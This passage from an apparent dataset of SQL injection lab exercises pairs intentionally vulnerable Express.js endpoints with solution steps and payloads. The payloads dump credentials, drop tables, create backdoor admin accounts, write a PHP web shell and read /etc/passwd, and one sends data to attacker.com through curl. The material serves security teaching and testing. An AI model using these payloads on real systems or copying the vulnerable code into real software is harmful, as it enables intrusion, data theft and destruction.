    "srcCode": "app.get('/hierarchy', (req, res) => {\n  const { root } = req.query;\n  const query = `\n    WITH RECURSIVE tree AS (\n      SELECT * FROM nodes WHERE id = ${root}\n      UNION ALL\n      SELECT n.* FROM nodes n JOIN tree t ON n.parent = t.id\n    ) SELECT * FROM tree`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1) UNION SELECT 1,2,3 FROM users--",
      "1); INSERT INTO backdoor VALUES ('attacker','pass')--",
      "1 OR EXISTS(SELECT * FROM sensitive_nodes)--"
    ]
  },
  {
    "Lab scenario": "Error-based SQL injection in E-Commerce product page",
    "Lab Description": "The product details page builds SQL queries using product ID directly from the URL without sanitization. Errors are exposed in the response. To solve: Use error-based SQL injection to leak database version and table structure.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /product?id=1",
      "Inject payload: 1' AND 1=CONVERT(int, @@version)--",
      "Observe SQL error with version info",
      "Extract table names with: 1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
      "Document database structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/product', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT * FROM products WHERE id = '${id}'`;\n  db.query(query, (err, result) => {\n    if (err) res.send(err.message); // Error leakage\n    else res.json(result);\n  });\n});",
    "payloads": [
      "1' AND 1=CONVERT(int, @@version)--",
      "1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--"
    ]
  },
  {
    "Lab scenario": "Union-based SQL injection in Feedback form",
    "Lab Description": "The feedback form includes a name field used in a SQL query without filtering. The application returns query results directly. To solve: Use UNION-based SQL injection to extract admin credentials and session tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit feedback with name: ' UNION SELECT null,username,password FROM users--",
      "Determine correct column count first with ORDER BY",
      "Extract session tokens with: ' UNION SELECT session_id,null FROM user_sessions--",
      "Hijack admin session using stolen token"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/feedback', (req, res) => {\n  const { name, message } = req.body;\n  const query = `INSERT INTO feedback (name, message) VALUES ('${name}', '${message}') RETURNING name`;\n  db.query(query, (err, result) => {\n    res.send(`Thanks for your feedback, ${result.rows[0].name}`);\n  });\n});",
    "payloads": [
      "' UNION SELECT null,username,password FROM users--",
      "' UNION SELECT 1,version(),3--"
    ]
  },
  {
    "Lab scenario": "Second-order SQL injection in User Settings",
    "Lab Description": "The app stores user profile data directly into the database and uses it later in SQL queries. The stored input is not sanitized. To solve: Inject SQL in a stored field and trigger it during subsequent profile operations.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Change username to: admin'--",
      "Trigger profile update to execute stored payload",
      "Verify admin privileges were acquired",
      "Check database logs for injection evidence"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/updateProfile', (req, res) => {\n  const { username } = req.body;\n  const id = req.session.userId;\n  db.query(`UPDATE users SET username='${username}' WHERE id=${id}`);\n  res.send('Profile updated');\n});\n\napp.get('/profile', (req, res) => {\n  const query = `SELECT * FROM users WHERE username='${req.session.username}'`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "admin'--",
      "'; UPDATE users SET is_admin=1 WHERE id=1--"
    ]
  },
  {
    "Lab scenario": "SQL injection in DELETE endpoint of Project Manager",
    "Lab Description": "The project deletion feature takes a project ID directly from URL parameters and performs a deletion without validation. To solve: Use SQL injection to delete critical tables and disrupt application functionality.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Call /deleteProject?id=1; DROP TABLE audit_logs--",
      "Verify logs table was deleted",
      "Attempt to access audit functionality",
      "Document system disruption"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.delete('/deleteProject', (req, res) => {\n  const id = req.query.id;\n  db.query(`DELETE FROM projects WHERE id = ${id}`);\n  res.send('Project deleted');\n});",
    "payloads": [
      "1; DROP TABLE audit_logs--",
      "1; TRUNCATE TABLE user_sessions--"
    ]
  },
  {
    "Lab scenario": "Blind SQL injection via cookie in Employee Portal",
    "Lab Description": "The session token cookie is included in a query without sanitization. The response does not change but time delays can be observed. To solve: Use blind time-based injection to retrieve admin credentials character by character.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send request with cookie: session=abc' OR IF(1=1,SLEEP(5),0)--",
      "Measure response time to confirm injection",
      "Extract password hash with: ' OR IF(ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50,SLEEP(5),0)--",
      "Reconstruct full hash through binary search"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.use((req, res, next) => {\n  const session = req.cookies.session;\n  const q = `SELECT * FROM sessions WHERE token='${session}'`;\n  db.query(q);\n  next();\n});",
    "payloads": [
      "abc' OR SLEEP(5)--",
      "' OR IF((SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%'),SLEEP(5),0)--"
    ]
  },
  {
    "Lab scenario": "SQL injection in Inventory filter dropdown",
    "Lab Description": "The inventory filter takes user input and builds the WHERE clause directly. No input validation is performed. To solve: Inject SQL to extract supplier pricing data and competitor information.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit /inventory?filter=electronics",
      "Change to: electronics' UNION SELECT supplier_id,price FROM supplier_pricing--",
      "Extract competitor pricing data",
      "Document sensitive business information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/inventory', (req, res) => {\n  const filter = req.query.filter || 'all';\n  const q = `SELECT item_name,description FROM items WHERE category='${filter}'`;\n  db.all(q, (err, rows) => res.json(rows));\n});",
    "payloads": [
      "electronics' UNION SELECT supplier_id,price FROM supplier_pricing--",
      "' UNION SELECT credit_card,expiry FROM supplier_payments--"
    ]
  },
  {
    "Lab scenario": "SQL injection in Registration endpoint's email check",
    "Lab Description": "The registration system checks if the email exists using an unsanitized query. The response shows different errors based on query results. To solve: Use SQLi to create a privileged account and bypass authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send registration request with email: test@example.com'; INSERT INTO users (email,password,role) VALUES ('admin@hacked.com','pwned','superadmin')--",
      "Verify account creation in database",
      "Login with new privileged credentials",
      "Access restricted admin functionality"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/checkEmail', (req, res) => {\n  const { email } = req.body;\n  db.query(`SELECT * FROM users WHERE email = '${email}'`, (err, rows) => {\n    if (rows.length) res.json({ available: false });\n    else res.json({ available: true });\n  });\n});",
    "payloads": [
      "test@example.com'; INSERT INTO users (email,password,role) VALUES ('admin@hacked.com','pwned','superadmin')--",
      "'; UPDATE users SET role='admin' WHERE email='existing@user.com'--"
    ]
  },
  {
    "Lab scenario": "Boolean-based SQL injection in Newsletter subscription",
    "Lab Description": "The newsletter form processes email input in a SQL query. Application returns different messages based on whether the email exists. To solve: Use Boolean SQLi to enumerate all valid user emails.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit: ' OR EXISTS(SELECT 1 FROM users WHERE email LIKE '%@company.com')--",
      "Confirm if any company emails exist",
      "Brute-force specific emails: ' OR email='ceo@company.com'--",
      "Build complete user email list"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/subscribe', (req, res) => {\n  const { email } = req.body;\n  const query = `SELECT * FROM subscribers WHERE email='${email}'`;\n  db.query(query, (err, rows) => {\n    if (rows.length) res.send('Already subscribed');\n    else res.send('Thanks for subscribing!');\n  });\n});",
    "payloads": [
      "' OR EXISTS(SELECT 1 FROM users WHERE email LIKE '%@company.com')--",
      "' OR email='admin@company.com'--"
    ]
  },
  {
    "Lab scenario": "SQL injection via search suggestion API",
    "Lab Description": "The suggestion feature uses search terms directly in SQL. Output is visible to users in real-time. To solve: Exploit the injection to dump all user credentials and session tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Call /suggest?q=a",
      "Inject: a%' UNION SELECT CONCAT(username,':',password) FROM users--",
      "Observe credential suggestions in response",
      "Extract all sensitive data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/suggest', (req, res) => {\n  const q = req.query.q || '';\n  const query = `SELECT term FROM search_terms WHERE term LIKE '${q}%' LIMIT 5`;\n  db.all(query, (err, rows) => res.json(rows));\n});",
    "payloads": [
      "a%' UNION SELECT CONCAT(username,':',password) FROM users--",
      "x%' UNION SELECT credit_card FROM payments--"
    ]
  },
  {
    "Lab scenario": "SQL injection in admin panel IP logger",
    "Lab Description": "Admin panel logs visitor IPs directly into SQL without escaping. The application is not vulnerable to output-based SQLi, but the query is injectable. To solve: Inject SQL to create a web shell for persistent access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Spoof IP address to: 1.1.1.1'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
      "Trigger admin visit to log malicious IP",
      "Access created web shell at /shell.php",
      "Execute system commands through web shell"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;\n  const logQuery = `INSERT INTO ip_logs (ip, visited_at) VALUES ('${ip}', NOW())`;\n  db.query(logQuery);\n  next();\n});",
    "payloads": [
      "1.1.1.1'; SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php'--",
      "'; COPY (SELECT * FROM sensitive_data) TO '/var/www/html/leak.csv'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Enumeration Query",
    "Lab Description": "A GraphQL endpoint exposes database introspection through a vulnerable enum field. The application fails to sanitize enum values used in raw SQL. To solve: Exploit the enum parameter to extract database schema information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send GraphQL introspection query to identify enum fields",
      "Craft malicious enum value: ' UNION SELECT table_name FROM information_schema.tables--",
      "Use aliases to bypass field restrictions",
      "Extract column definitions through error messages",
      "Map complete database structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const { GraphQLEnumType } = require('graphql');\n\nconst DbEnumType = new GraphQLEnumType({\n  name: 'DbTables',\n  values: {\n    USERS: { value: 'users' },\n    POSTS: { value: 'posts' }\n  }\n});\n\nconst queryType = new GraphQLObjectType({\n  name: 'Query',\n  fields: {\n    tableData: {\n      type: new GraphQLList(StringType),\n      args: { table: { type: DbEnumType } },\n      resolve: (_, { table }) => {\n        return db.query(`SELECT * FROM ${table}`); // Vulnerable\n      }\n    }\n  }\n});",
    "payloads": [
      "{ tableData(table: \"users' UNION SELECT table_name FROM information_schema.tables--\") }",
      "{ tableData(table: \"posts'||(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'))\" }"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQL Injection in Hybrid Document Query",
    "Lab Description": "An application converts MongoDB-style queries to SQL for reporting. The $match operator is vulnerable to SQL injection during conversion. To solve: Break out of document context to execute raw SQL commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $match parameter in reporting API",
      "Break query context: {\"$match\":{\"$expr\":{\"$eq\":[1,\"1); SELECT 1--\"]}}}",
      "Execute stacked queries via $function operator",
      "Dump database through OOB exfiltration",
      "Verify data extraction through side channels"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/reports', (req, res) => {\n  const { filters } = req.body;\n  const sql = convertMongoToSQL(filters); // Vulnerable conversion\n  db.query(sql, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "{\"$match\":{\"$expr\":{\"$eq\":[1,\"1); SELECT * FROM users--\"]}}}",
      "{\"$project\":{\"x\":\"$' UNION SELECT 1,2,3 FROM information_schema.tables--\"}}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Geospatial Function Argument",
    "Lab Description": "A mapping application uses unsanitized user input in PostGIS functions. The ST_Contains parameter is vulnerable to injection. To solve: Exploit geometry parsing to execute system commands via PostGIS extensions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable coordinate parameter in map query",
      "Break WKT context with: POLYGON((0 0,1 1))); SELECT pg_read_file('/etc/passwd')--",
      "Load malicious PostGIS extension",
      "Execute OS commands via extension functions",
      "Exfiltrate data through network calls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/within-boundary', (req, res) => {\n  const coords = req.query.coords;\n  const query = `SELECT * FROM locations WHERE ST_Contains(\n    ST_GeomFromText('POLYGON((${coords}))'),\n    point\n  )`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "0 0,100 100)); SELECT pg_read_file('/etc/passwd')--",
      "0 0,1 1)); COPY (SELECT * FROM passwords) TO PROGRAM 'curl attacker.com/?leak=$(base64 /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Full-Text Search Dictionary",
    "Lab Description": "A search application allows custom dictionary configuration through URL parameters. The dictionary name is used unsafely in ts_parse function. To solve: Break out of dictionary context to execute arbitrary queries.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable dictionary parameter",
      "Break dictionary syntax: english' UNION SELECT current_user--",
      "Access full-text search internals",
      "Extract document vectors containing sensitive data",
      "Reconstruct documents from search index"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/parse-text', (req, res) => {\n  const { text, dict } = req.query;\n  const query = `SELECT ts_parse('${dict}', '${text}')`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "english' UNION SELECT current_user--",
      "simple' FROM ts_debug('english', 'test') WHERE alias='word' AND lexeme='test')--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Array Aggregation Function",
    "Lab Description": "A reporting tool builds array_agg queries with user-controlled sort orders. The ORDER BY clause within array_agg is vulnerable. To solve: Exploit array construction to leak data through error messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable array aggregation endpoint",
      "Inject through ORDER BY clause: array_agg(id ORDER BY 1/(SELECT CASE WHEN current_user='admin' THEN 1 ELSE 0 END))",
      "Trigger divide-by-zero errors for boolean tests",
      "Extract data through error differentials",
      "Reconstruct sensitive information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/user-stats', (req, res) => {\n  const { sort } = req.query;\n  const query = `SELECT array_agg(user_id ORDER BY ${sort}) FROM activity`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1/(SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')=1 THEN 1 ELSE 0 END)",
      "1, (SELECT password FROM users WHERE username='admin' LIMIT 1)"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Window Function Frame",
    "Lab Description": "An analytics dashboard allows custom window frame specifications. The ROWS BETWEEN clause is vulnerable to injection. To solve: Break out of window frame context to access underlying tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable frame parameter",
      "Break frame syntax: ROWS BETWEEN 1 PRECEDING AND 1) UNION SELECT 1,2,3--",
      "Access window function partition columns",
      "Exfiltrate data through aggregate functions",
      "Bypass row visibility controls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/rolling-avg', (req, res) => {\n  const { frame } = req.query;\n  const query = `\n    SELECT date, \n      AVG(value) OVER (ORDER BY date ${frame || 'ROWS 7 PRECEDING'})\n    FROM metrics`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "ROWS BETWEEN 1 PRECEDING AND 1) UNION SELECT 1,2,3 FROM users--",
      "ROWS UNBOUNDED PRECEDING) EXECUTE IMMEDIATE 'COPY (SELECT * FROM secrets) TO ''/tmp/leak.csv'''--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in JSON Path Query",
    "Lab Description": "A document store exposes JSON path queries that get converted to SQL. The jsonpath parameter is vulnerable to injection. To solve: Break out of path context to execute raw SQL.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify vulnerable jsonpath parameter",
      "Break path syntax: $.user') OR 1=1--",
      "Access JSON storage internals",
      "Extract all documents through path traversal",
      "Bypass document-level permissions"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/query-docs', (req, res) => {\n  const { path } = req.query;\n  const query = `\n    SELECT jsonb_path_query(doc, '${path}') \n    FROM documents`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "$.user') OR 1=1--",
      "$.user'')) FROM jsonb_array_elements(doc->'users') WHERE (doc->>'password') LIKE 'a%'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Materialized View Refresh",
    "Lab Description": "A data warehouse allows triggering materialized view refreshes with user-controlled parameters. The WITH DATA clause is vulnerable. To solve: Exploit refresh privileges to modify underlying data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify refresh endpoint with parameter",
      "Inject through WITH clause: sales_data WITH DATA); UPDATE users SET is_admin=true--",
      "Verify privilege escalation",
      "Access restricted functionality",
      "Cover tracks through view reconstruction"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/refresh-view', (req, res) => {\n  const { view, options } = req.body;\n  const query = `REFRESH MATERIALIZED VIEW ${view} ${options}`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('View refreshed');\n  });\n});",
    "payloads": [
      "sales_data WITH DATA); UPDATE users SET is_admin=true--",
      "inventory WITH NO DATA); COPY (SELECT * FROM passwords) TO '/tmp/leak'--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Recursive CTE Base Case",
    "Lab Description": "A hierarchical data viewer builds recursive CTEs with user input in the anchor member. The WITH RECURSIVE clause is vulnerable. To solve: Break recursion to access arbitrary tables.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable root node parameter",
      "Break CTE syntax: 1) UNION SELECT 1,2,3 FROM passwords--",
      "Access recursive query internals",
      "Exfiltrate data through depth-limited recursion",
      "Bypass hierarchical access controls"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/org-chart', (req, res) => {\n  const { root } = req.query;\n  const query = `\n    WITH RECURSIVE hierarchy AS (\n      SELECT * FROM employees WHERE id = ${root}\n      UNION ALL\n      SELECT e.* FROM employees e\n      JOIN hierarchy h ON e.manager_id = h.id\n    ) SELECT * FROM hierarchy`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1) UNION SELECT 1,2,3 FROM passwords--",
      "1 OR EXISTS(SELECT * FROM sensitive_departments)--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in Custom Aggregate Function",
    "Lab Description": "An analytics application registers custom aggregate functions that use unsanitized input. The final function parameter is vulnerable. To solve: Break out of aggregate context to execute commands.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable aggregate function",
      "Break function syntax: my_agg(1) FROM (SELECT 1) x) OR 1=1--",
      "Access aggregate function internals",
      "Execute commands through extension functions",
      "Bypass aggregation constraints"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/custom-stats', (req, res) => {\n  const { param } = req.query;\n  const query = `SELECT my_custom_agg(${param}) FROM metrics`;\n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "1) FROM (SELECT 1) x) OR 1=1--",
      "1); SELECT pg_read_file('/etc/passwd')--"
    ]
  },
  {
    "Lab scenario": "SQL injection in mobile app feedback submission",
    "Lab Description": "A mobile app sends user feedback via a POST request. The backend inserts feedback into the database without sanitizing inputs and returns the inserted record. To solve: Use SQL injection to extract usernames and passwords from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture POST /feedback request",
      "Modify 'feedback' parameter to: test'); SELECT username,password FROM users--",
      "Observe response containing leaked credentials",
      "Refine payload to target specific admin accounts",
      "Verify extracted credentials by attempting login"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.json());\n\napp.post('/feedback', (req, res) => {\n  const comment = req.body.feedback;\n  const query = `INSERT INTO feedback (text) VALUES ('${comment}') RETURNING *`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "test'); SELECT username,password FROM users--",
      "test'); UNION SELECT null,table_name FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "SQL injection in newsletter subscription email field",
    "Lab Description": "The newsletter signup form takes an email and inserts it into a database. The input is directly embedded into the SQL query and errors are displayed. To solve: Perform SQL injection to extract the database schema and admin credentials.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit test@example.com' to trigger SQL error",
      "Use UNION-based injection: ' UNION SELECT table_name,null FROM information_schema.tables--",
      "Extract column names from information_schema.columns",
      "Dump sensitive data from identified tables",
      "Document the database structure"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/subscribe', (req, res) => {\n  const email = req.body.email;\n  const query = `INSERT INTO subscribers (email) VALUES ('${email}')`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('Subscribed!');\n  });\n});",
    "payloads": [
      "test@example.com' UNION SELECT table_name,null FROM information_schema.tables--",
      "' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--"
    ]
  },
  {
    "Lab scenario": "SQL injection via URL parameter in product filtering",
    "Lab Description": "A product page filters items by category passed through URL. The app does not escape input and returns full query results. To solve: Inject SQL to extract database version, schema, and user credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Browse to /products?cat=1",
      "Determine column count using ORDER BY",
      "Inject: 1 UNION SELECT null,@@version,null--",
      "Extract table structure from information_schema",
      "Dump sensitive data using UNION SELECT"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/products', (req, res) => {\n  const cat = req.query.cat || '1';\n  const query = `SELECT id, name, price FROM items WHERE category_id=${cat}`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "1 UNION SELECT null,@@version,null--",
      "1 UNION SELECT null,table_name,null FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "SQL injection in e-commerce search autocomplete",
    "Lab Description": "The search endpoint for autocomplete queries embeds user input into SQL with no validation and returns matched results. To solve: Use SQL injection to list all database tables and extract sensitive customer data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture request to /search?q=a",
      "Determine column count using ORDER BY",
      "Inject: a%' UNION SELECT table_name,null FROM information_schema.tables--",
      "Extract column names for sensitive tables",
      "Dump customer emails and payment information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.q || '';\n  const query = `SELECT name, description FROM products WHERE name LIKE '${q}%' LIMIT 5`;\n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "a%' UNION SELECT table_name,null FROM information_schema.tables--",
      "x%' UNION SELECT email,credit_card FROM customers--"
    ]
  },
  {
    "Lab scenario": "SQL injection in forgotten password reset email lookup",
    "Lab Description": "Password reset sends an email if a user exists. The lookup query is vulnerable and returns different responses. To solve: Use boolean-based SQL injection to enumerate valid user emails and extract password hashes.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Submit test@example.com' OR 1=1-- to trigger all resets",
      "Use boolean conditions to test email existence",
      "Extract password hashes character by character",
      "Crack hashes offline",
      "Verify compromised accounts"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/reset-password', (req, res) => {\n  const email = req.body.email;\n  const query = `SELECT id FROM users WHERE email = '${email}'`;\n  db.query(query, (err, result) => {\n    if (result.rows.length) {\n      sendResetEmail(email);\n      return res.send('Reset link sent');\n    }\n    res.send('Email not found');\n  });\n});",
    "payloads": [
      "test@example.com' OR 1=1--",
      "admin@example.com' AND SUBSTRING(password,1,1)='a'--"
    ]
  },
  {
    "Lab scenario": "Blind SQL injection in user deletion audit trail",
    "Lab Description": "User deletion logs activity using input from 'reason' parameter. The app uses raw SQL for inserts with no feedback. To solve: Use time-based blind SQLi to infer database contents and extract sensitive information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept POST /delete-user with reason=test",
      "Test for time delays: test' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--",
      "Extract data character by character using timing",
      "Automate extraction with SQLMap",
      "Document extracted credentials"
    ],
    "Vulnerability name": "Blind SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/delete-user', (req, res) => {\n  const reason = req.body.reason;\n  const query = `INSERT INTO deletions_log (user_id, reason) VALUES (${req.user.id}, '${reason}')`;\n  db.query(query);\n  res.send('User deleted.');\n});",
    "payloads": [
      "test' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--",
      "test' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>50,SLEEP(5),0)--"
    ]
  },
  {
    "Lab scenario": "SQL injection in URL shortener preview endpoint",
    "Lab Description": "A preview feature allows users to inspect shortened URLs. It uses unsanitized query strings and returns full URL details. To solve: Use UNION-based SQLi to leak sensitive URLs and associated metadata.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to /preview?id=abc123",
      "Determine column count using ORDER BY",
      "Inject: abc123' UNION SELECT long_url,click_count,null FROM urls--",
      "Extract all URLs with metadata",
      "Identify sensitive internal URLs"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/preview', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT id, long_url, created_at FROM shortened WHERE id='${id}'`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "abc123' UNION SELECT long_url,click_count,null FROM urls--",
      "xyz789' UNION SELECT user_ip,referrer,null FROM url_access_logs--"
    ]
  },
  {
    "Lab scenario": "SQL injection in real-time chat message sending",
    "Lab Description": "Messages in a chat are saved using unsanitized input and returned to users. Attackers can inject SQL commands to extract historical messages. To solve: Dump the complete chat history and user information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp to intercept POST /send with message param",
      "Payload: test'); SELECT username,message FROM chat JOIN users ON chat.user_id=users.id--",
      "View leaked messages with usernames in response",
      "Extract private messages between admins",
      "Document sensitive conversations"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/send', (req, res) => {\n  const msg = req.body.message;\n  const query = `INSERT INTO chat (user_id, message) VALUES (${req.user.id}, '${msg}') RETURNING *`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "test'); SELECT username,message FROM chat JOIN users ON chat.user_id=users.id--",
      "hello'); UNION SELECT email,password FROM users--"
    ]
  },
  {
    "Lab scenario": "SQL injection in blog comment reply system",
    "Lab Description": "Replying to blog comments appends user input into SQL statements and displays results. To solve: Inject SQL to enumerate database structure and extract admin credentials.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit reply: test'); SELECT table_name FROM information_schema.tables--",
      "Identify users table structure",
      "Extract admin credentials: ' UNION SELECT username,password FROM admins--",
      "Verify credentials by logging in as admin",
      "Document database schema"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/reply', (req, res) => {\n  const reply = req.body.reply;\n  const query = `INSERT INTO replies (comment_id, text) VALUES (${req.params.id}, '${reply}') RETURNING *`;\n  db.query(query, (err, result) => {\n    res.json(result.rows[0]);\n  });\n});",
    "payloads": [
      "test'); SELECT table_name FROM information_schema.tables--",
      "x'); UNION SELECT username,password FROM admins--"
    ]
  },
  {
    "Lab scenario": "SQL injection in contact form backend with stacked queries",
    "Lab Description": "The contact form saves user messages into the DB directly and allows stacked queries. Input is used without escaping. To solve: Use stacked queries to modify database content and gain admin access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send POST /contact with message: test'; CREATE TABLE backdoor(cmd TEXT);--",
      "Verify table creation through error messages",
      "Execute commands: '; COPY backdoor FROM PROGRAM 'id';--",
      "Exfiltrate data through created backdoor",
      "Clean up traces after exploitation"
    ],
    "Vulnerability name": "SQL injection (stacked queries)",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/contact', (req, res) => {\n  const msg = req.body.message;\n  const query = `INSERT INTO contact (email, message) VALUES ('${req.body.email}', '${msg}')`;\n  db.query(query, (err) => {\n    if (err) return res.status(500).send(err.message);\n    res.send('Thanks!');\n  });\n});",
    "payloads": [
      "test'; CREATE TABLE backdoor(cmd TEXT);--",
      "hi'; COPY (SELECT * FROM passwords) TO '/var/www/html/leak.csv';--"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Node ID Parameter",
    "Lab Description": "A GraphQL API implements node ID resolution with direct SQL concatenation. The global ID parameter is vulnerable to injection. To solve: Exploit the node resolver to extract schema metadata.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send GraphQL introspection query to identify node field",
      "Craft malicious node ID: ' UNION SELECT schema_name FROM information_schema.schemata--",
      "Use aliases to bypass field type restrictions",
      "Extract database structure through ID parameter",
      "Map all database relations via GraphQL types"
